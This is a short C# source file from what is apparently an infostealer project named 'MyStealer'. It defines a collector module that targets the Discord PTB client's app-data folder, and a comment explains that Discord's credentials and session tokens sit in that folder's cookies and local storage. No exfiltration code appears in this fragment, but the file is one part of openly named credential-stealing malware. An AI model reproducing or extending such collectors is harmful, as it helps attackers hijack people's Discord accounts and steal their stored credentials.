﻿using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    // Discord is not a browser; it's a messenger
    // but it uses CEF as backend, and all credentials and session tokens are stored in cookies & local storage
    internal class DiscordPTB : Discord
    {
        public override string ModuleName => "Discord PTB";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb");
    }
}
